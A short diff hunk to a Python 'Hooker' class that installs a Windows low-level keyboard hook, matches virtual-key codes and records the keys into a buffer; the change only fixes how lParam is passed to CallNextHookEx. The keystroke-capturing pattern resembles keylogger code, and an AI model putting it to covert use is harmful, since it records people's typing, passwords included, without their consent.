@@ -120,7 +120,7 @@ class Hooker:
                         if kb.vkCode == value:
                             self.line.extend(bytes(key, "utf8"))
 
-        return user32.CallNextHookEx(self.is_hooked, nCode, wParam, c_ulong(lParam))
+        return user32.CallNextHookEx(self.is_hooked, nCode, wParam, lParam)
 
     def start(self):
         if self.install_hook():
